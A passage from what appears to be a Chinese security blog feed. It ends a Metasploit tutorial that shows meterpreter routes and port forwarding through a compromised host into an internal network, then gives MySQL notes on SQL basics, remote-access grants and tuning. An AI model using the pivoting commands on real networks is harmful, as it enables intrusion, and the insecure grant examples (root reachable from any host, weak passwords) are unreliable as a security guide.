<p>添加一条通向目标服务器内网的路由<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;run autoroute -s 100.0.0.0/8 (根据目标内网网络而定)</div></pre></td></tr></table></figure></p>
<p>查看路由设置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;run autoroute –p</div></pre></td></tr></table></figure></p>
<p>一般来说，在meterpreter中设置路由便可以达到通往其内网的目的。然而有些时候还是会失败，这时我们可以background返回msf&gt;，查看下外面的路由情况。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">route <span class="built_in">print</span></div></pre></td></tr></table></figure></p>
<p>如果发现没有路由信息，说明meterpreter shell设置的路由并没有生效，我们可以在msf中添加路由。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msf&gt;route add 10.0.0.0 255.0.0.0 1</div></pre></td></tr></table></figure></p>
<p>说明：1表示session 1，攻击机如果要去访问10.0.0.0/8网段的资源，其下一跳是session1，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。</p>
<h4 id="meterpreter端口转发"><a href="#meterpreter端口转发" class="headerlink" title="meterpreter端口转发"></a>meterpreter端口转发</h4><p>假设目前我们扫描到了10网段的某个ip存在mysql弱口令，账号密码都有了，那么我们可以在肉鸡服务器上登陆目标服务器mysql。当然，如果我想在攻击机上去登陆mysql，可以使用端口转发。（某些情况下，内网的机器也不能互相ssh，需要登陆堡垒机）</p>
<p>在meterpreter shell中输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; portfwd add -l 55555 -r 10.0.0.1 -p 3306</div></pre></td></tr></table></figure></p>
<p>表示将10.0.0.1服务器上的3306端口转发到本地的55555端口，然后我们可以在本地运行mysql –h 127.0.0.1 –u root –P 55555 –p 去登陆mysql。其他端口如ssh、ftp等都类似，这个过程跟msf代理很像。</p>
<p><em>网络上关于metasploit用法的资料很多，这里主要记录一些常用用法，以及个人使用过程中的一些坑</em></p>
<p>参考文章：<br><a href="http://www.freebuf.com/sectool/72135.html" target="_blank" rel="external">http://www.freebuf.com/sectool/72135.html</a><br><a href="http://blog.csdn.net/lzhd24/article/details/50664342" target="_blank" rel="external">http://blog.csdn.net/lzhd24/article/details/50664342</a><br><a href="http://blog.csdn.net/qq_34457594/article/details/52756458" target="_blank" rel="external">http://blog.csdn.net/qq_34457594/article/details/52756458</a><br><a href="http://www.freebuf.com/sectool/56432.html" target="_blank" rel="external">http://www.freebuf.com/sectool/56432.html</a><br><a href="http://www.freebuf.com/articles/network/125278.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/125278.html</a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="http://thief.one/2017/07/12/1/">【渗透神器系列】DNS信息查询</a><br><a href="http://thief.one/2017/04/10/1/">【渗透神器系列】nc</a><br><a href="http://thief.one/2017/05/02/1/">【渗透神器系列】nmap</a><br><a href="http://thief.one/2017/04/27/1">【渗透神器系列】Fiddler</a><br><a href="http://thief.one/2017/05/19/1">【渗透神器系列】搜索引擎</a><br><a href="http://thief.one/2017/02/09/WireShark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/">【渗透神器系列】WireShark</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Learn to walk before you run&lt;br&gt;先学走，再学跑&lt;/blockquote&gt;&lt;br&gt;　　今天玩了一把内网渗透，其中主要用到了metasploit这款内网渗透神器。metasploit大家肯定不陌生，我也在很早之前就有接触过，但每次重新使用它时都会遗忘一些用法，因此为了方便查询我在本篇记录下metasploit神器的一些常用命令，以及内网渗透中如何使用它。&lt;br&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://thief.one/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="渗透神器" scheme="http://thief.one/tags/%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/"/>
    
      <category term="metasploit" scheme="http://thief.one/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Mysql相关笔记</title>
    <link href="http://thief.one/2017/07/26/1/"/>
    <id>http://thief.one/2017/07/26/1/</id>
    <published>2017-07-26T06:45:30.000Z</published>
    <updated>2017-08-31T07:24:24.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Take control of your own desting<br>命运掌握在自己手上</blockquote><br>　　最近由于项目需要，特地研究了下mysql数据库。虽然大学期间曾学习过mysql，但由于之前开发一直用rethinkdb以及mongodb数据库，因此对mysql已经有些生疏了。最近在使用期间也遇到了很多坑，但幸好最终还是靠着强大的Google解决了所有问题。因此在此记录下mysql相关问题的一些笔记，其中可能会涉及Mysql安全相关的问题，比如利用mysql导出shell、mysql提权等，权当备份。<br><a id="more"></a></p>
<h2 id="Mysql基础命令"><a href="#Mysql基础命令" class="headerlink" title="Mysql基础命令"></a>Mysql基础命令</h2><p>想要mysql玩得6，mysql命令行必须会用，或者说sql必须会，一起复习一下吧。</p>
<h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>查看数据库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">show databases;</div></pre></td></tr></table></figure></p>
<p>使用数据库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">use  数据库名称;</div></pre></td></tr></table></figure></p>
<p>新建数据库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CREATE DATABASE mydb;</div></pre></td></tr></table></figure></p>
<p>删除数据库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DROP DATABASE mydb;</div></pre></td></tr></table></figure></p>
<h3 id="数据库表操作"><a href="#数据库表操作" class="headerlink" title="数据库表操作"></a>数据库表操作</h3><p>查看当前数据库表：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">show tables;</div></pre></td></tr></table></figure></p>
<p>创建数据表：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE teacher(</div><div class="line">id int primary key auto_increment,</div><div class="line">name varchar(20),</div><div class="line">gender char(1),</div><div class="line">age int(2),</div><div class="line">birth date,</div><div class="line">description varchar(100),</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>查看表结构：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">desc  表名;</div></pre></td></tr></table></figure></p>
<p>删除表（DROP TABLE语句）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DROP TABLE teacher;</div></pre></td></tr></table></figure></p>
<p>注：drop table 语句会删除该的所有记录及表结构</p>
<p>修改表结构（ALTER TABLE语句）：</p>
<ul>
<li>alter table test add column job varchar(10); –添加表列</li>
<li>alter table test rename test1; –修改表名</li>
<li>alter table test drop column name; –删除表列</li>
<li>alter table test modify address char(10) –修改表列类型（改类型）</li>
<li>alter table test change address address1  char(40) –修改表列类型（改名字和类型，和下面的一行效果一样）</li>
<li>alter table test change column address address1 varchar(30)–修改表列名（改名字和类型）</li>
</ul>
<h3 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h3><p>添加数据：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">INSERT INTO 表名(字段1,字段2,字段3) values(值，值，值);</div></pre></td></tr></table></figure></p>
<p>查询数据：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from 表名;</div></pre></td></tr></table></figure></p>
<p>修改数据：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE 表名 SET 字段1名=值,字段2名=值,字段3名=值 <span class="built_in">where</span> 字段名=值;</div></pre></td></tr></table></figure></p>
<p>删除数据：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DELETE FROM 表名;</div></pre></td></tr></table></figure></p>
<p><em>以上命令是最最基础的，但也是最常用的</em></p>
<h2 id="常用Sql语句"><a href="#常用Sql语句" class="headerlink" title="常用Sql语句"></a>常用Sql语句</h2><h3 id="获取固定数量的结果"><a href="#获取固定数量的结果" class="headerlink" title="获取固定数量的结果"></a>获取固定数量的结果</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from table <span class="built_in">limit</span> m,n</div></pre></td></tr></table></figure>
<p>说明：其中m是指记录开始的index，从0开始，表示第一条记录；n是指从第m+1条开始，取n条。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from table <span class="built_in">limit</span> 0,n</div></pre></td></tr></table></figure></p>
<p>说明：查询前n条结果。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from table <span class="built_in">limit</span> m,-1</div></pre></td></tr></table></figure></p>
<p>说明：查询m行以后的结果。</p>
<h3 id="查询字符串"><a href="#查询字符串" class="headerlink" title="查询字符串"></a>查询字符串</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM table WHERE name like <span class="string">'%PHP%'</span></div></pre></td></tr></table></figure>
<p>说明：%表示模糊查询，%php表示以php结尾的所有结果，%php%表示包含php的所有结果。</p>
<h3 id="非空查询"><a href="#非空查询" class="headerlink" title="非空查询"></a>非空查询</h3><p>查询address字段不为空的结果。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM table WHERE address &lt;&gt;<span class="string">''</span></div></pre></td></tr></table></figure></p>
<h3 id="判断查询"><a href="#判断查询" class="headerlink" title="判断查询"></a>判断查询</h3><p>查询age在0-18之间的结果。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM table WHERE age BETWEEN 0 AND 18</div></pre></td></tr></table></figure></p>
<h3 id="查询结果的数量"><a href="#查询结果的数量" class="headerlink" title="查询结果的数量"></a>查询结果的数量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select count(*) from table</div></pre></td></tr></table></figure>
<h3 id="查询结果不显示重复记录"><a href="#查询结果不显示重复记录" class="headerlink" title="查询结果不显示重复记录"></a>查询结果不显示重复记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT DISTINCT 字段名 FROM 表名 WHERE 查询条件</div></pre></td></tr></table></figure>
<p>注:SQL语句中的DISTINCT必须与WHERE子句联合使用，否则输出的信息不会有变化 ,且字段不能用*代替。</p>
<h3 id="查询排序"><a href="#查询排序" class="headerlink" title="查询排序"></a>查询排序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT 字段名 FROM tb_stu WHERE 条件 ORDER BY 字段 DESC 降序</div><div class="line">SELECT 字段名 FROM tb_stu WHERE 条件 ORDER BY 字段 ASC  升序</div></pre></td></tr></table></figure>
<p>注:对字段进行排序时若不指定排序方式，则默认为ASC升序。</p>
<h3 id="多条件查询排序"><a href="#多条件查询排序" class="headerlink" title="多条件查询排序"></a>多条件查询排序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT 字段名 FROM tb_stu WHERE 条件 ORDER BY 字段1 ASC 字段2 DESC</div></pre></td></tr></table></figure>
<h3 id="多表联合查询"><a href="#多表联合查询" class="headerlink" title="多表联合查询"></a>多表联合查询</h3><p>多表查询有三种方式：交叉查询、等值查询、外部查询（左连接、右连接）<br>参考：<a href="http://blog.csdn.net/hguisu/article/details/5731880" target="_blank" rel="external">http://blog.csdn.net/hguisu/article/details/5731880</a></p>
<h4 id="交叉连接查询"><a href="#交叉连接查询" class="headerlink" title="交叉连接查询"></a>交叉连接查询</h4><p>交叉查询可将2表中所有的数据都查出，比较耗时。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM table1 CROSS JOIN table2   </div><div class="line">SELECT * FROM table1 JOIN table2   </div><div class="line">SELECT * FROM table1,table2</div></pre></td></tr></table></figure></p>
<h4 id="等值连接查询"><a href="#等值连接查询" class="headerlink" title="等值连接查询"></a>等值连接查询</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM table1 INNER JOIN table2</div></pre></td></tr></table></figure>
<h4 id="外部连接查询"><a href="#外部连接查询" class="headerlink" title="外部连接查询"></a>外部连接查询</h4><p>这种查询是最常用的，查找出a与b表中公有的，另外查出只有a表或b表独有的。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select id, name from user left join techer on user.id = teacher.id</div><div class="line">select id, name from user right join techer on user.id = teacher.id</div></pre></td></tr></table></figure></p>
<h4 id="三表查询"><a href="#三表查询" class="headerlink" title="三表查询"></a>三表查询</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select id, name from user left join techer on user.id = teacher.id left join home on teacher.id=home.id</div></pre></td></tr></table></figure>
<h2 id="Mysql使用权限问题"><a href="#Mysql使用权限问题" class="headerlink" title="Mysql使用权限问题"></a>Mysql使用权限问题</h2><h3 id="只能本地连接mysql，远程机器连接不了？"><a href="#只能本地连接mysql，远程机器连接不了？" class="headerlink" title="只能本地连接mysql，远程机器连接不了？"></a>只能本地连接mysql，远程机器连接不了？</h3><p>当我在服务器上搭建好mysql，输入以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@ ~]<span class="comment"># mysql -u root -p</span></div><div class="line">Enter password:</div><div class="line">mysql&gt;</div></pre></td></tr></table></figure></p>
<p>当输入mysql密码，出现mysql&gt;提示后，说明已经成功登陆mysql。</p>
<p>我满心欢喜地打开自己的mac，准备远程连接服务器上的mysql，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[Mac~]mysql -u root -p -h 192.168.2.2</div><div class="line">Enter password: </div><div class="line">ERROR 1045 (28000): Access denied <span class="keyword">for</span> user <span class="string">'root'</span>@<span class="string">'192.168.2.2'</span> (using password: YES)</div></pre></td></tr></table></figure></p>
<p>显示登陆失败，原因是mysql默认只支持本地登陆，不支持远程登陆。</p>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>第一步，登陆mysql（服务器本地登陆，因为远程登陆不了），查看user表（内置表）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">mysql&gt; use mysql;  <span class="comment">#选择mysql数据库（mysql是数据库名称）</span></div><div class="line">mysql&gt; select host,user,password from user; <span class="comment">#(查看user表中的内容)</span></div><div class="line">+-----------+------------+-------------------------------------------+</div><div class="line">| host      | user       | password                                  |</div><div class="line">+-----------+------------+-------------------------------------------+</div><div class="line">| localhost | root       | *21D8392A6B4CA12B9D194ED3E245258C4BE56DBA |</div><div class="line">| 127.0.0.1 | root       | *930D8392A6B4CA12B9D194ED3E245258C4BE56DB |</div><div class="line">+-----------+------------+-------------------------------------------+</div><div class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt;</div></pre></td></tr></table></figure></p>
<p>可以看到，user表中目前只有一个root用户，并且host为127.0.0.1/localhost，也就是说root用户目前只支持本地ip访问连接。</p>
<p>第二步，修改表内容</p>
<p>增加一个用户，将host设置为%<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;CREATE USER <span class="string">'nmask'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'123456'</span>;</div></pre></td></tr></table></figure></p>
<p>或者更改root用户的host字段内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;update user <span class="built_in">set</span> host = <span class="string">'%'</span> <span class="built_in">where</span> user = <span class="string">'root'</span>;</div></pre></td></tr></table></figure></p>
<p>flush(必须要flush，使之生效)：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;flush privileges;</div></pre></td></tr></table></figure></p>
<p>查看用户<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select host,user from mysql.user;</div></pre></td></tr></table></figure></p>
<p>再看下user表内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select host,user,password from user;</div><div class="line">+-----------+------------+-------------------------------------------+</div><div class="line">| host      | user       | password                                  |</div><div class="line">+-----------+------------+-------------------------------------------+</div><div class="line">| localhost | root       | *21D8392A6B4CA12B9D194ED3E245258C4BE56DBA |</div><div class="line">| 127.0.0.1 | root       | *930D8392A6B4CA12B9D194ED3E245258C4BE56DB |</div><div class="line">| %         | nmask      | *435A8F39F0791250895CA1DE2068FDC2CB477122 |</div><div class="line">+-----------+------------+-------------------------------------------+</div><div class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</div></pre></td></tr></table></figure></p>
<p>可以看到user表中增加了一个用户nmask，host为%。</p>
<p>重启Mysql：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo /etc/init.d/mysqld restart</div></pre></td></tr></table></figure></p>
<p>此时再用nmask用户远程连接下Mysql：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql -u nmask -p -h 192.168.2.2</div><div class="line">Enter password: </div><div class="line">mysql&gt;</div></pre></td></tr></table></figure></p>
<p>连接成功，因为此用户host内容为%，表示允许任何主机访问此mysql服务。</p>
<h3 id="用户权限很低"><a href="#用户权限很低" class="headerlink" title="用户权限很低"></a>用户权限很低</h3><p>当我用nmask账号登陆后，发现权限很低，具体表现为只能看到information_schema数据库。</p>
<h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><p>在添加此用户时，就赋予其权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt;INSERT INTO user</div><div class="line">    -&gt;     VALUES(<span class="string">'%'</span>,<span class="string">'nmask'</span>,PASSWORD(<span class="string">'123456'</span>),</div><div class="line">    -&gt;     <span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>);</div><div class="line">mysql&gt;flush privileges;</div></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt;CREATE USER <span class="string">'nmask'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'123456'</span>;</div><div class="line">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO <span class="string">'nmask'</span>@<span class="string">'%'</span> WITH GRANT OPTION;</div><div class="line">mysql&gt;flush privileges;</div></pre></td></tr></table></figure></p>
<p>如果是phpmyadmin，可以通过root用户登陆后，进入user表进行修改。</p>
<p>最后重启Mysql：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo /etc/init.d/mysqld restart</div></pre></td></tr></table></figure></p>
<h3 id="自定义授权问题"><a href="#自定义授权问题" class="headerlink" title="自定义授权问题"></a>自定义授权问题</h3><p>如果想nmask使用123456密码从任何主机连接到mysql服务器，其他密码不行，则可以：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO <span class="string">'nmask'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'123456'</span> WITH GRANT OPTION;</div><div class="line">mysql&gt;flush privileges;</div></pre></td></tr></table></figure></p>
<p>如果想允许用户nmask只能从ip为10.0.0.1的主机连接到mysql服务器，并只能使用123456作为密码。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO <span class="string">'nmask'</span>@<span class="string">'10.0.0.1'</span> IDENTIFIED BY <span class="string">'123456'</span> WITH GRANT OPTION;</div><div class="line">mysql&gt;flush privileges;</div></pre></td></tr></table></figure></p>
<p>最后重启Mysql：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo /etc/init.d/mysqld restart</div></pre></td></tr></table></figure></p>
<h3 id="只能连接localhost？"><a href="#只能连接localhost？" class="headerlink" title="只能连接localhost？"></a>只能连接localhost？</h3><p>连接报错信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERROR 2003 (HY000): Can<span class="string">'t connect to MySQL server on '</span>192.168.10.2<span class="string">' (111) 不能用192.168.10.2去连接。</span></div></pre></td></tr></table></figure></p>
<h4 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h4><p>修改/etc/my.cnf内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bind_address=127.0.0.1 改成 bind_address=192.168.10.2</div></pre></td></tr></table></figure></p>
<p>重启mysql服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo /etc/init.d/mysqld restart</div></pre></td></tr></table></figure></p>
<p><em>脱坑秘籍：通过mysql命令行修改内容后，要记得plush；如果还不生效，尝试restart mysql服务</em></p>
<h3 id="报错：too-many-connections"><a href="#报错：too-many-connections" class="headerlink" title="报错：too many connections"></a>报错：too many connections</h3><p>一般mysql默认最大连接数是100，当mysql连接数超过这个时，会报错此错；解决方案可以更改/etc/my.cof文件，更改最大连接上限。<br>在[mysqld]中新增max_connections=N，如果你没有这个文件请从编译源码中的support-files文件夹中复制你所需要的*.cnf文件为到 /etc/my.cnf<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">[mysqld]</div><div class="line">port = 3306</div><div class="line">socket = /tmp/mysql.sock</div><div class="line">skip-locking</div><div class="line">key_buffer = 160M</div><div class="line">max_allowed_packet = 1M</div><div class="line">table_cache = 64</div><div class="line">sort_buffer_size = 512K</div><div class="line">net_buffer_length = 8K</div><div class="line">read_buffer_size = 256K</div><div class="line">read_rnd_buffer_size = 512K</div><div class="line">myisam_sort_buffer_size = 8M</div><div class="line">max_connections=1000</div></pre></td></tr></table></figure></p>
<h3 id="mysql服务重启出错"><a href="#mysql服务重启出错" class="headerlink" title="mysql服务重启出错"></a>mysql服务重启出错</h3><p>mysql重启如果出错，可以先查看日志，在/var/log/mysql.log中查看具体的错误。<br>一般来说，可能是权限问题，如果mysql是mysql用户权限，则需要切换到sudo su mysql用户下去启动mysql服务。</p>
<h2 id="Mysql性能优化"><a href="#Mysql性能优化" class="headerlink" title="Mysql性能优化"></a>Mysql性能优化</h2><h3 id="mysql-insert加速"><a href="#mysql-insert加速" class="headerlink" title="mysql insert加速"></a>mysql insert加速</h3><p>　　insert是操作数据库最常用的动作，当有大量数据需要插入数据库时，性能至关重要，即插入数据的速度。mysql insert性能优化参考：<a href="http://blog.jobbole.com/29432/" target="_blank" rel="external">http://blog.jobbole.com/29432/</a></p>
<h4 id="方案：一条SQL语句插入多条数据（亲测有效）"><a href="#方案：一条SQL语句插入多条数据（亲测有效）" class="headerlink" title="方案：一条SQL语句插入多条数据（亲测有效）"></a>方案：一条SQL语句插入多条数据（亲测有效）</h4><p>将sql语句修改成以下类型，即一条sql语句插入多条数据，可大大提高插入效率。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">INSERT INTO `insert_table` (`datetime`, `uid`, `content`, `<span class="built_in">type</span>`) VALUES (<span class="string">'0'</span>, <span class="string">'userid_0'</span>, <span class="string">'content_0'</span>, 0), (<span class="string">'1'</span>, <span class="string">'userid_1'</span>, <span class="string">'content_1'</span>, 1);</div></pre></td></tr></table></figure></p>
<p>修改后的插入操作能够提高程序的插入效率。这里第二种SQL执行效率高的主要原因有两个，一是减少SQL语句解析的操作， 只需要解析一次就能进行数据的插入操作，二是SQL语句较短，可以减少网络传输的IO。</p>
<h4 id="方案：在事务中进行插入处理"><a href="#方案：在事务中进行插入处理" class="headerlink" title="方案：在事务中进行插入处理"></a>方案：在事务中进行插入处理</h4><p>插入改成以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">START TRANSACTION;</div><div class="line">INSERT INTO `insert_table` (`datetime`, `uid`, `content`, `<span class="built_in">type</span>`) VALUES (<span class="string">'0'</span>, <span class="string">'userid_0'</span>, <span class="string">'content_0'</span>, 0);</div><div class="line">INSERT INTO `insert_table` (`datetime`, `uid`, `content`, `<span class="built_in">type</span>`) VALUES (<span class="string">'1'</span>, <span class="string">'userid_1'</span>, <span class="string">'content_1'</span>, 1);</div><div class="line">...</div><div class="line">COMMIT;</div></pre></td></tr></table></figure></p>
<p>　　使用事务可以提高数据的插入效率，这是因为进行一个INSERT操作时，MySQL内部会建立一个事务，在事务内进行真正插入处理。通过使用事务可以减少创建事务的消耗，所有插入都在执行后才进行提交操作。</p>
<p>注意事项：</p>
<ol>
<li>SQL语句是有长度限制，在进行数据合并在同一SQL中务必不能超过SQL长度限制，通过max_allowed_packet配置可以修改，默认是1M。</li>
<li>事务需要控制大小，事务太大可能会影响执行的效率。MySQL有innodb_log_buffer_size配置项，超过这个值会日志会使用磁盘数据，这时，效率会有所下降。所以比较好的做法是，在事务大小达到配置项数据级前进行事务提交。</li>
</ol>
<h2 id="Python操作Mysql"><a href="#Python操作Mysql" class="headerlink" title="Python操作Mysql"></a>Python操作Mysql</h2><p>利用python开发时，经常会用到跟mysql相关的操作，这时候需要利用第三方库，MySQLdb。</p>
<h3 id="MySQLdb安装"><a href="#MySQLdb安装" class="headerlink" title="MySQLdb安装"></a>MySQLdb安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo pip install mysql-python</div></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install python-mysqldb</div></pre></td></tr></table></figure></p>
<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><p>导入模块<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">import MySQLdb</div></pre></td></tr></table></figure></p>
